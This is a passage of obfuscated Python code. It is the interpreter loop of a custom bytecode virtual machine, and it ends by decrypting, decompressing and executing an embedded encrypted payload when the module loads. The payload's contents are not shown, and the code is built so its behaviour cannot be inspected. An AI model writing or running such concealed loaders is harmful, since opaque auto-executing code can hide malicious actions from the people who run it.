                _s3jlzzkx = stack.pop(); frame[6] = ((arg if _s3jlzzkx else frame[6] - 45 ^ 9731) ^ 9731) + 45
              elif opcode == 2140:
                _dk6vneywcj = consts.__getitem__(arg); stack.append(_dk6vneywcj)
            elif opcode < 2410:
              if opcode == 2258:
                keys = stack.pop(); kw_count = len(keys); pos_count = arg - kw_count; kw_values = stack[-kw_count:] if kw_count > 0 else []
                if kw_count > 0:
                  del stack[-kw_count:]
                pos_args = stack[-pos_count:] if pos_count > 0 else []
                if pos_count > 0:
                  del stack[-pos_count:]
                func = stack.pop()
                dec_keys = tuple((bytes((x ^ k[0] for x in k[1])).decode('utf-8') if isinstance(k, list) else k for k in keys))
                kwargs = dict(zip(dec_keys, kw_values))
                if isinstance(func, _types.MethodType) and isinstance(func.__func__, _i0ycvnij):
                  pos_args = [func.__self__] + list(pos_args); func = func.__func__
                if isinstance(func, _i0ycvnij):
                  _fl = _agj8eu2w(func.code, pos_args, kwargs, func.defaults, func.kw_defaults)
                  frame[20] = _bk6scw1k(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
                else:
                  stack.append(func(*pos_args, **kwargs))
            elif opcode == 2410:
              frame[6] = ((frame[6] - 45 ^ 9731) + (arg - (frame[6] - 45 ^ 9731)) ^ 9731) + 45
            elif opcode == 2434:
              left = fastlocals[arg[0]]; right = consts[arg[1]]; cmp_arg = arg[2]; res = False
              if cmp_arg == 0:
                res = left < right
              elif cmp_arg == 1:
                res = left <= right
              elif cmp_arg == 2:
                res = left == right
              elif cmp_arg == 3:
                res = left != right
              elif cmp_arg == 4:
                res = left > right
              elif cmp_arg == 5:
                res = left >= right
              elif cmp_arg == 6:
                res = left in right
              elif cmp_arg == 7:
                res = left not in right
              elif cmp_arg == 8:
                res = left is right
              elif cmp_arg == 9:
                res = left is not right
              elif cmp_arg == 10:
                res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
              stack.append(res)
          elif opcode < 3420:
            if opcode < 3122:
              if opcode < 2685:
                if opcode < 2582:
                  if opcode == 2531:
                    locals_dict[names[arg]] = stack.pop()
                  elif opcode == 2555:
                    if arg[0] == 0:
                      raise
                    elif arg[0] == 1:
                      raise registers[arg[1]]
                    elif arg[0] == 2:
                      raise registers[arg[1]] from registers[arg[2]]
                elif opcode == 2582:
                  _v = stack.pop(); _d = arg if arg is not None and arg > 0 else 1; stack[-_d] += [_v]
                elif opcode == 2585:
                  del stack[len(stack) - 1]
              elif opcode < 2812:
                if opcode == 2685:
                  registers[arg[0]] = registers[arg[1]][registers[arg[2]]]
                elif opcode == 2763:
                  frame[6] = ((frame[6] - 45 ^ 9731) + (arg - (frame[6] - 45 ^ 9731)) ^ 9731) + 45
              elif opcode < 2836:
                if opcode == 2812:
                  _ypvkldykq = names[arg]
                  if _ypvkldykq in globals_dict:
                    stack.append(globals_dict[_ypvkldykq])
                  elif _ypvkldykq == 'super':
                    def _srbwq0zs79(*args):
                      if not args:
                        if True and frame[15] and hasattr(frame[15], '__class_owner__') and frame[18]:
                          return _builtins.super(frame[15].__class_owner__, frame[18][0])
                      return _builtins.super(*args)
                    stack.append(_srbwq0zs79)
                  elif builtins_dict and _ypvkldykq in builtins_dict:
                    stack.append(builtins_dict[_ypvkldykq])
                  else:
                    raise NameError(f"name '{_ypvkldykq}' is not defined")
              elif opcode == 2836:
                _r, _tgt = arg
                if not bool(registers[_r]):
                  frame[6] = (_tgt ^ 9731) + 45
              elif opcode == 3076:
                registers[arg[0]] = registers[arg[1]]
            elif opcode < 3278:
              if opcode < 3197:
                if opcode == 3122:
                  right = stack.pop(); left = stack.pop(); stack.append(left == right)
                elif opcode == 3173:
                  _nidx, _src = arg; locals_dict[names[_nidx]] = registers[_src]
              elif opcode < 3261:
                if opcode == 3197:
                  registers[arg[0]] = slice(registers[arg[1]], registers[arg[1] + 1]) if arg[2] == 2 else slice(registers[arg[1]], registers[arg[1] + 1], registers[arg[1] + 2])
              elif opcode == 3261:
                frame[6] = (arg ^ 9731) + 45
              elif opcode == 3266:
                right = stack.pop(); left = stack.pop(); stack.append(left << right)
            elif opcode < 3312:
              if opcode == 3278:
                _n = names[arg]
                if _n in locals_dict:
                  locals_dict.pop(_n)
                else:
                  raise NameError(f"name '{_n}' is not defined")
              elif opcode == 3290:
                if frame[5] is not None:
                  frame[5](None, None, None); frame[5] = None
            elif opcode < 3327:
              if opcode == 3312:
                _a, _b = stack[-2:]; del stack[-2:]; stack.append(_a * _b)
            elif opcode == 3327:
              right = stack.pop(); left = stack.pop(); stack.append(left is not right)
            elif opcode == 3339:
              registers[arg[0]] = [registers[arg[1] + i] for i in range(arg[2])]
          elif opcode < 4020:
            if opcode < 3624:
              if opcode < 3497:
                if opcode == 3420:
                  _d, _s1, _s2 = arg; registers[_d] = registers[_s1] * registers[_s2]
                elif opcode == 3478:
                  if arg == 0:
                    stack.append(list())
                  else:
                    _items = [stack.pop() for _ in range(arg)][::-1]; stack.append(_items)
              elif opcode < 3529:
                if opcode == 3497:
                  registers[arg[0]] = consts[arg[1]]
              elif opcode == 3529:
                _d, _s1, _s2 = arg; _a = registers[_s1]; _b = registers[_s2]
                frame[16] = (frame[16] * 1103515245 + 12345 ^ (_a if type(_a) is int else 0)) & 4294967295
                registers[_d] = (_a | _b) - (_a & _b) if type(_a) is int and type(_b) is int else _a ^ _b
              elif opcode == 3599:
                stack[-1] = +stack[-1]
            elif opcode < 3801:
              if opcode == 3624:
                _zbvhilei = names[arg]; _jsib35zsvw = stack.pop(); locals_dict.__setitem__(_zbvhilei, _jsib35zsvw)
              elif opcode == 3645:
                _dst, _nidx = arg; _name = names[_nidx]
                if _name in locals_dict:
                  registers[_dst] = locals_dict[_name]
                elif _name in globals_dict:
                  registers[_dst] = globals_dict[_name]
                elif _name == 'super':
                  def _srbwq0zs79(*args):
                    if not args:
                      if True and frame[15] and hasattr(frame[15], '__class_owner__') and frame[18]:
                        return _builtins.super(frame[15].__class_owner__, frame[18][0])
                    return _builtins.super(*args)
                  registers[_dst] = _srbwq0zs79
                elif builtins_dict and _name in builtins_dict:
                  registers[_dst] = builtins_dict[_name]
                else:
                  raise NameError(f"name '{_name}' is not defined")
            elif opcode < 3899:
              if opcode == 3801:
                fromlist = stack.pop(); level = stack.pop(); name = consts[arg]
                import_func = builtins_dict.get('__import__', _builtins.__import__) if builtins_dict else _builtins.__import__
                stack.append(import_func(name, globals_dict, locals_dict, fromlist, level))
            elif opcode == 3899:
              _val = stack[-1]; del stack[-1]; _lz0v78nvl = _val
              if _nbusank91i(_lz0v78nvl):
                continue
              return _lz0v78nvl
            elif opcode == 3925:
              _args = [stack.pop() for _ in range(arg)][::-1] if arg > 0 else []; _func = stack.pop()
              if isinstance(_func, _types.MethodType) and isinstance(_func.__func__, _i0ycvnij):
                _args = [_func.__self__] + list(_args); _func = _func.__func__
              if isinstance(_func, _i0ycvnij):
                _fl = _agj8eu2w(_func.code, _args, {}, _func.defaults, _func.kw_defaults)
                frame[20] = _bk6scw1k(_func.code, _func.globals_dict, fastlocals=_fl, closure=_func.closure, func=_func)
              else:
                stack.append(_func(*_args))
          elif opcode < 4763:
            if opcode < 4210:
              if opcode == 4020:
                _d, _b, _c = arg; _m = {}
                for i in range(_c):
                  _m[registers[_b + 2 * i]] = registers[_b + 2 * i + 1]
                registers[_d] = _m
              elif opcode == 4138:
                _val = stack.pop(); globals_dict[names[arg]] = _val
            elif opcode < 4328:
              if opcode == 4210:
                stack += [consts[arg]]
            elif opcode == 4328:
              _g0wbesb6 = stack.pop(); delattr(_g0wbesb6, names[arg])
            elif opcode == 4427:
              _nmz2cp20y = stack.pop(); stack[-1] = stack[-1] >> _nmz2cp20y
          elif opcode < 4909:
            if opcode == 4763:
              def _hib8vj6mv(func, name, *bases, **kwds):
                meta = kwds.get('metaclass')
                if meta is None:
                  meta = type(bases[0]) if bases else type
                ns = meta.__prepare__(name, bases, **kwds) if hasattr(meta, '__prepare__') else {}
                if hasattr(func, 'execute_with_locals'):
                  func.execute_with_locals(ns)
                elif callable(func):
                  func()
                cls = meta(name, bases, ns, **kwds)
                for item in ns.values():
                  if hasattr(item, '__code__') or hasattr(item, '__class_owner__'):
                    item.__class_owner__ = cls
                return cls
              registers[arg] = _hib8vj6mv
            elif opcode == 4829:
              frame[6] = ((arg if not stack[-1] else frame[6] - 45 ^ 9731) ^ 9731) + 45
          elif opcode < 4927:
            if opcode == 4909:
              _it, _dst, _tgt = arg
              try:
                registers[_dst] = next(registers[_it])
              except StopIteration:
                frame[6] = (_tgt ^ 9731) + 45
          elif opcode == 4927:
            delattr(registers[arg[0]], names[arg[1]])
          elif opcode == 4947:
            val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].update(val)
        elif _pce4 == 2:
          if opcode < 1946:
            if opcode < 1096:
              if opcode < 491:
                if opcode < 221:
                  if opcode == 59:
                    registers[arg[0]] = registers[arg[1]] / registers[arg[2]]
                  elif opcode == 119:
                    del registers[arg[0]][registers[arg[1]]]
                elif opcode < 370:
                  if opcode == 221:
                    _l = registers[arg[0]]; _r = registers[arg[1]]; _c = arg[2]; _res = False
                    if _c == 0:
                      _res = _l < _r
                    elif _c == 1:
                      _res = _l <= _r
                    elif _c == 2:
                      _res = _l == _r
                    elif _c == 3:
                      _res = _l != _r
                    elif _c == 4:
                      _res = _l > _r
                    elif _c == 5:
                      _res = _l >= _r
                    elif _c == 6:
                      _res = _l in _r
                    elif _c == 7:
                      _res = _l not in _r
                    elif _c == 8:
                      _res = _l is _r
                    elif _c == 9:
                      _res = _l is not _r
                    elif _c == 10:
                      _res = isinstance(_l, _r) or (isinstance(_l, type) and issubclass(_l, _r))
                    registers[arg[0]] = _res
                  elif opcode == 324:
                    _val = stack.pop(); globals_dict[names[arg]] = _val
                elif opcode == 370:
                  _id3kyafl = stack.pop(); _l3n4mg5l = stack.pop(); _qq3pu04at5 = stack.pop(); _l3n4mg5l[_id3kyafl] = _qq3pu04at5
                elif opcode == 382:
                  _r = stack.pop(); stack[-1] = stack[-1] - _r
              elif opcode < 609:
                if opcode == 491:
                  stack += [fastlocals[arg]]
                elif opcode == 515:
                  if stack[-1]:
                    frame[6] = (arg ^ 9731) + 45
                  else:
                    stack.pop()
              elif opcode < 818:
                if opcode < 772:
                  if opcode == 609:
                    def _hib8vj6mv(func, name, *bases, **kwds):
                      meta = kwds.get('metaclass')
                      if meta is None:
                        meta = type(bases[0]) if bases else type
                      ns = meta.__prepare__(name, bases, **kwds) if hasattr(meta, '__prepare__') else {}
                      if hasattr(func, 'execute_with_locals'):
                        func.execute_with_locals(ns)
                      else:
                        func()
                      cls = meta(name, bases, ns, **kwds)
                      for item in ns.values():
                        if hasattr(item, '__code__') or hasattr(item, 'code'):
                          item.__class_owner__ = cls
                      return cls
                    stack.append(_hib8vj6mv)
                  elif opcode == 639:
                    right = stack.pop(); left = stack.pop()
                    stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
                elif opcode == 772:
                  _lz0v78nvl = registers[arg]
                  if _nbusank91i(_lz0v78nvl):
                    continue
                  return _lz0v78nvl
              elif opcode == 818:
                registers[arg[0]] = consts[arg[1]]
              elif opcode == 1051:
                const_idx, var_idx = arg
                while len(fastlocals) <= var_idx:
                  fastlocals.append(None)
                fastlocals[var_idx] = consts[const_idx]
            elif opcode < 1474:
              if opcode < 1238:
                if opcode < 1151:
                  if opcode == 1096:
                    registers[arg] = stack.pop()
                elif opcode == 1151:
                  _a, _b = stack[-2:]; del stack[-2:]; stack.append(_a + _b)
                elif opcode == 1169:
                  _z6p79959 = stack.pop(); _p9ob82yg = stack[-1]
                  frame[16] = (frame[16] * 1664525 + 1013904223 ^ (_p9ob82yg if type(_p9ob82yg) is int else 0)) & 4294967295
                  stack[-1] = (_p9ob82yg & ~_z6p79959) - (~_p9ob82yg & _z6p79959) if type(_p9ob82yg) is int and type(_z6p79959) is int else _p9ob82yg - _z6p79959
              elif opcode == 1238:
                _a = fastlocals[arg[0]]; _b = fastlocals[arg[1]]; stack.append(_a + _b)
              elif opcode == 1460:
                name = names[arg]; obj = stack.pop(); val = stack.pop(); setattr(obj, name, val)
            elif opcode < 1607:
              if opcode < 1550:
                if opcode == 1474:
                  stack[-1] = iter(stack[-1])
                elif opcode == 1532:
                  registers[arg[0]] = getattr(registers[arg[1]], names[arg[2]])
              elif opcode < 1604:
                if opcode == 1550:
                  _xlfmwbuoc, _wb1gzb0yss = stack[-2:]; del stack[-2:]; stack.append(_xlfmwbuoc @ _wb1gzb0yss)
                elif opcode == 1590:
                  name = names[arg]
                  if name in locals_dict:
                    stack.append(locals_dict[name])
                  elif name in globals_dict:
                    stack.append(globals_dict[name])
                  elif name == 'super':
                    def _srbwq0zs79(*args):
                      if not args:
                        if True and frame[15] and hasattr(frame[15], '__class_owner__') and frame[18]:
                          return _builtins.super(frame[15].__class_owner__, frame[18][0])
                      return _builtins.super(*args)
                    stack.append(_srbwq0zs79)
                  elif builtins_dict and name in builtins_dict:
                    stack.append(builtins_dict[name])
                  else:
                    raise NameError(f"name '{name}' is not defined")
              elif opcode == 1604:
                _ullsrxuf = stack.pop(); frame[6] = ((arg if not _ullsrxuf else frame[6] - 45 ^ 9731) ^ 9731) + 45
            elif opcode < 1677:
              if opcode < 1619:
                if opcode == 1607:
                  registers[arg[0]] = getattr(registers[arg[1]], names[arg[2]])
              elif opcode == 1619:
                right = stack.pop(); left = stack.pop()
                if arg == 0:
                  stack.append(left < right)
                elif arg == 1:
                  stack.append(left <= right)
                elif arg == 2:
                  stack.append(left == right)
                elif arg == 3:
                  stack.append(left != right)
                elif arg == 4:
                  stack.append(left > right)
                elif arg == 5:
                  stack.append(left >= right)
                elif arg == 6:
                  stack.append(left in right)
                elif arg == 7:
                  stack.append(left not in right)
                elif arg == 8:
                  stack.append(left is right)
                elif arg == 9:
                  stack.append(left is not right)
                elif arg == 10:
                  stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
              elif opcode == 1631:
                right = stack.pop(); left = stack.pop(); stack.append(left <= right)
            elif opcode < 1904:
              if opcode == 1677:
                _d, _s1, _s2 = arg; registers[_d] = registers[_s1] | registers[_s2]
              elif opcode == 1717:
                _dk6vneywcj = consts[arg]; stack.extend([_dk6vneywcj])
            elif opcode == 1904:
              _n = names[arg]
              if _n in locals_dict:
                del locals_dict[_n]
              elif _n in globals_dict:
                del globals_dict[_n]
              else:
                raise NameError(f"name '{_n}' is not defined")
            elif opcode == 1925:
              _val = registers[arg]; stack.append(_val)
          elif opcode < 3666:
            if opcode < 2755:
              if opcode < 2541:
                if opcode < 2205:
                  if opcode == 1946:
                    _a5i5hzh32k = names[arg]
                    if _a5i5hzh32k in locals_dict:
                      stack.append(locals_dict[_a5i5hzh32k])
                    elif _a5i5hzh32k in globals_dict:
                      stack.append(globals_dict[_a5i5hzh32k])
                    elif _a5i5hzh32k == 'super':
                      def _srbwq0zs79(*args):
                        if not args:
                          if True and frame[15] and hasattr(frame[15], '__class_owner__') and frame[18]:
                            return _builtins.super(frame[15].__class_owner__, frame[18][0])
                        return _builtins.super(*args)
                      stack.append(_srbwq0zs79)
                    elif builtins_dict and _a5i5hzh32k in builtins_dict:
                      stack.append(builtins_dict[_a5i5hzh32k])
                    else:
                      raise NameError(f"name '{_a5i5hzh32k}' is not defined")
                  elif opcode == 2012:
                    _src = fastlocals[arg[0]]
                    while len(fastlocals) <= arg[1]:
                      fastlocals.append(None)
                    fastlocals[arg[1]] = _src
                elif opcode < 2398:
                  if opcode == 2205:
                    _idx, _src = arg
                    while len(fastlocals) <= _idx:
                      fastlocals.append(None)
                    fastlocals[_idx] = registers[_src]
                  elif opcode == 2395:
                    _lz0v78nvl = stack.pop()
                    if _nbusank91i(_lz0v78nvl):
                      continue
                    return _lz0v78nvl
                elif opcode < 2478:
                  if opcode == 2398:
                    stack[-1:] = []
                  elif opcode == 2472:
                    right = stack.pop(); left = stack.pop(); stack.append(left >= right)
                elif opcode == 2478:
                  _dst, _idx = arg; registers[_dst] = fastlocals[_idx]
              elif opcode < 2550:
                if opcode == 2541:
                  stack.extend([fastlocals[arg[0]] * fastlocals[arg[1]]])
                elif opcode == 2544:
                  setattr(registers[arg[0]], names[arg[1]], registers[arg[2]])
              elif opcode < 2719:
                if opcode == 2550:
                  registers[arg[0]] = registers[arg[1]] ** registers[arg[2]]
                elif opcode == 2707:
                  val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].extend(val)
              elif opcode == 2719:
                registers[arg] = stack.pop()
              elif opcode == 2735:
                if frame[12]:
                  _b = frame[12].pop()
                  if _b.type == _ugv73aoyf.WITH:
                    frame[5] = _b.exit_fn
            elif opcode < 3207:
              if opcode < 2980:
                if opcode == 2755:
                  if bool(stack[-1]) is True:
                    frame[6] = (arg ^ 9731) + 45
                elif opcode == 2946:
                  right = stack.pop(); left = stack.pop()
                  if arg == 0:
                    stack.append(not left >= right)
                  elif arg == 1:
                    stack.append(not left > right)
                  elif arg == 2:
                    stack.append(not left != right)
                  elif arg == 3:
                    stack.append(not left == right)
                  elif arg == 4:
                    stack.append(not left <= right)
                  elif arg == 5:
                    stack.append(not left < right)
                  elif arg == 6:
                    stack.append(left in right)
                  elif arg == 7:
                    stack.append(not left in right)
                  elif arg == 8:
                    stack.append(left is right)
                  elif arg == 9:
                    stack.append(not left is right)
                  elif arg == 10:
                    stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
              elif opcode < 2986:
                if opcode == 2980:
                  stack.append(fastlocals[arg])
              elif opcode < 3001:
                if opcode == 2986:
                  try:
                    _ffzt2m90dv = next(stack[-1]); stack.append(_ffzt2m90dv)
                  except StopIteration:
                    stack.pop(); frame[6] = (arg ^ 9731) + 45
              elif opcode == 3001:
                if arg == 0:
                  raise
                elif arg == 1:
                  raise stack.pop()
                elif arg == 2:
                  cause = stack.pop(); exc = stack.pop(); raise exc from cause
              elif opcode == 3140:
                _rccgroqe = stack.pop(); stack.append(-_rccgroqe)
            elif opcode < 3276:
              if opcode == 3207:
                stack.append(fastlocals[arg[0]] - consts[arg[1]])
              elif opcode == 3216:
                _val = registers[arg]; stack.append(_val)
            elif opcode < 3564:
              if opcode == 3276:
                _d, _s = arg; registers[_d] = -registers[_s]
              elif opcode == 3510:
                right = stack.pop(); left = stack.pop(); stack.append(left & right)
            elif opcode < 3657:
              if opcode == 3564:
                _d, _s = arg; registers[_d] = ~registers[_s]
            elif opcode == 3657:
              code_obj = stack.pop(); kw_defaults = stack.pop() if arg & 2 else {}; defaults = stack.pop() if arg & 1 else (); closure = []
              if code_obj.freevars:
                for var in code_obj.freevars:
                  if var in frame[8].cellvars:
                    closure.append(frame[24][frame[8].cellvars.index(var)])
                  elif var in frame[8].freevars:
                    closure.append(frame[24][len(frame[8].cellvars) + frame[8].freevars.index(var)])
              fn = _i0ycvnij(code=code_obj, globals_dict=globals_dict, defaults=defaults, kw_defaults=kw_defaults, closure=tuple(closure))
              stack.append(fn)
            elif opcode == 3663:
              _mod = registers[arg]
              if hasattr(_mod, '__all__'):
                for _k in _mod.__all__:
                  locals_dict[_k] = getattr(_mod, _k)
              else:
                for _k, _v in _mod.__dict__.items():
                  if not _k.startswith('_'):
                    locals_dict[_k] = _v
          elif opcode < 4864:
            if opcode < 4096:
              if opcode < 3987:
                if opcode < 3939:
                  if opcode == 3666:
                    stack[-1], stack[-2] = (stack[-2], stack[-1])
                  elif opcode == 3903:
                    ctx_mgr = stack.pop(); enter_fn = getattr(ctx_mgr, '__enter__'); exit_fn = getattr(ctx_mgr, '__exit__')
                    res = enter_fn(); frame[12].append(_y31tq6yfhk(_ugv73aoyf.WITH, arg, len(stack), exit_fn=exit_fn)); stack.append(res)
                elif opcode == 3939:
                  registers[arg[0]] = fastlocals[arg[1]]
              elif opcode < 4024:
                if opcode == 3987:
                  _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left < right)
              elif opcode < 4041:
                if opcode == 4024:
                  _qxyco1ub = stack.pop(); _a5vkt18l = stack.pop(); stack.append(_a5vkt18l ** _qxyco1ub)
                elif opcode == 4030:
                  _o414b4jp = names[arg]; _bv8nxswm8n = stack.pop(); stack.append(getattr(_bv8nxswm8n, _o414b4jp))
              elif opcode == 4041:
                _d, _f, _flags = arg; _a = registers[_f + 1]; _kw = registers[_f + 2] if _flags & 1 else {}
                registers[_d] = registers[_f](*_a, **_kw)
            elif opcode < 4289:
              if opcode == 4096:
                _idx, _src = arg
                while len(fastlocals) <= _idx:
                  fastlocals.append(None)
                fastlocals[_idx] = registers[_src]
              elif opcode == 4189:
                _seq = list(registers[arg[0]]); _c = arg[2]
                for i in range(_c):
                  registers[arg[1] + _c - 1 - i] = _seq[i]
            elif opcode < 4507:
              if opcode < 4419:
                if opcode == 4289:
                  _r, _tgt = arg
                  if bool(registers[_r]):
                    frame[6] = (_tgt ^ 9731) + 45
              elif opcode == 4419:
                _dst, _nidx = arg; _name = names[_nidx]
                if _name in globals_dict:
                  registers[_dst] = globals_dict[_name]
                elif _name == 'super':
                  def _srbwq0zs79(*args):
                    if not args:
                      if True and frame[15] and hasattr(frame[15], '__class_owner__') and frame[18]:
                        return _builtins.super(frame[15].__class_owner__, frame[18][0])
                    return _builtins.super(*args)
                  registers[_dst] = _srbwq0zs79
                elif builtins_dict and _name in builtins_dict:
                  registers[_dst] = builtins_dict[_name]
                else:
                  raise NameError(f"name '{_name}' is not defined")
              elif opcode == 4504:
                _td0bm3u2b = stack.pop(); _ieyldcgu2l = stack[-1]; cmp_arg = arg
                if arg == 0:
                  stack[-1] = _ieyldcgu2l < _td0bm3u2b
                elif arg == 1:
                  stack[-1] = _ieyldcgu2l <= _td0bm3u2b
                elif arg == 2:
                  stack[-1] = _ieyldcgu2l == _td0bm3u2b
                elif arg == 3:
                  stack[-1] = _ieyldcgu2l != _td0bm3u2b
                elif arg == 4:
                  stack[-1] = _ieyldcgu2l > _td0bm3u2b
                elif arg == 5:
                  stack[-1] = _ieyldcgu2l >= _td0bm3u2b
                elif arg == 6:
                  stack[-1] = _ieyldcgu2l in _td0bm3u2b
                elif arg == 7:
                  stack[-1] = _ieyldcgu2l not in _td0bm3u2b
                elif arg == 8:
                  stack[-1] = _ieyldcgu2l is _td0bm3u2b
                elif arg == 9:
                  stack[-1] = _ieyldcgu2l is not _td0bm3u2b
                elif arg == 10:
                  stack[-1] = isinstance(_ieyldcgu2l, _td0bm3u2b) or (isinstance(_ieyldcgu2l, type) and issubclass(_ieyldcgu2l, _td0bm3u2b))
            elif opcode < 4613:
              if opcode == 4507:
                kwargs = stack.pop() if arg & 1 else {}; args = stack.pop(); func = stack.pop()
                if isinstance(func, _types.MethodType) and isinstance(func.__func__, _i0ycvnij):
                  args = tuple([func.__self__] + list(args)); func = func.__func__
                if isinstance(func, _i0ycvnij):
                  _fl = _agj8eu2w(func.code, args, kwargs, func.defaults, func.kw_defaults)
                  frame[20] = _bk6scw1k(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
                else:
                  stack.append(func(*args, **kwargs))
            elif opcode < 4719:
              if opcode == 4613:
                while len(fastlocals) <= arg:
                  fastlocals.append(None)
                fastlocals[arg] = stack[-1]
            elif opcode == 4719:
              _d, _f, _ac = arg; _keys = registers[_f + 1 + _ac]; _kwc = len(_keys); _posc = _ac - _kwc
              _pa = [registers[_f + 1 + i] for i in range(_posc)]; _kv = [registers[_f + 1 + _posc + i] for i in range(_kwc)]
              _dkeys = tuple((bytes((x ^ k[0] for x in k[1])).decode('utf-8') if isinstance(k, list) else k for k in _keys))
              registers[_d] = registers[_f](*_pa, **dict(zip(_dkeys, _kv)))
            elif opcode == 4815:
              _dst, _idx = arg; registers[_dst] = fastlocals[_idx]
          elif opcode < 4894:
            if opcode == 4864:
              if arg == 2:
                upper = stack.pop(); lower = stack.pop(); stack.append(slice(lower, upper))
              elif arg == 3:
                step = stack.pop(); upper = stack.pop(); lower = stack.pop(); stack.append(slice(lower, upper, step))
            elif opcode == 4891:
              stack.append(tuple(stack.pop()))
          elif opcode < 4922:
            if opcode == 4894:
              _d, _s = arg; registers[_d] = not registers[_s]
            elif opcode == 4919:
              if not stack[-1]:
                frame[6] = (arg ^ 9731) + 45
              else:
                stack.pop()
          elif opcode < 4982:
            if opcode == 4922:
              stack[-1] = ~stack[-1]
            elif opcode == 4939:
              seq = list(stack.pop())
              if len(seq) != arg:
                raise ValueError(f'need more than {len(seq)} values to unpack (expected {arg})')
              for item in reversed(seq):
                stack.append(item)
          elif opcode == 4982:
            _val = stack.pop(); globals_dict[names[arg]] = _val
        if frame[20] is not None:
          _kxosbfl7 = frame[20]; frame[20] = None; _h0dorhjqvn(_kxosbfl7); continue
      except Exception as exc:
        handled = False
        while True:
          while frame[12]:
            b = frame[12].pop()
            if b.type == _ugv73aoyf.WITH:
              del stack[b.stack_height:]; suppress = False
              if b.exit_fn:
                try:
                  suppress = bool(b.exit_fn(type(exc), exc, exc.__traceback__))
                except Exception:
                  suppress = False
              if suppress:
                frame[6] = (b.handler_pc ^ 9731) + 45; handled = True; break
            elif b.type in (_ugv73aoyf.EXCEPT, _ugv73aoyf.FINALLY):
              del stack[b.stack_height:]; stack.append(exc); frame[6] = (b.handler_pc ^ 9731) + 45; handled = True; break
          if handled:
            break
          if _lvtxb8a5:
            frame = _lvtxb8a5.pop(); code = frame[8]; instructions = code.instructions; consts = code.consts; names = code.names
            stack = frame[13]; registers = frame[17]; fastlocals = frame[18]; globals_dict = frame[0]; locals_dict = frame[22]
            builtins_dict = globals_dict.get('__builtins__')
            if isinstance(builtins_dict, type(_sys)):
              builtins_dict = builtins_dict.__dict__
            elif hasattr(builtins_dict, '__dict__'):
              builtins_dict = builtins_dict.__dict__
          else:
            break
        if not handled:
          raise
    return None
  finally:
    _t0jkqg84l = old_frame
def _camqy59o():
  _psn = _b8y6hyh5p(); decrypted = _ukzeuuy64l(_b64.b85decode(_a0i47fdl()), _sm755u35()); raw = _zlib.decompress(decrypted)
  reader = _xkj4e2mz(raw); root_code = _bqr8bnlv(reader); g = globals()
  if '__builtins__' not in g:
    g['__builtins__'] = _builtins
  f = _bk6scw1k(root_code, g, locals_dict=g)
  if _psn:
    f[16] = f[16] ^ _psn
  return _fh2r5q3s(f)
_camqy59o()
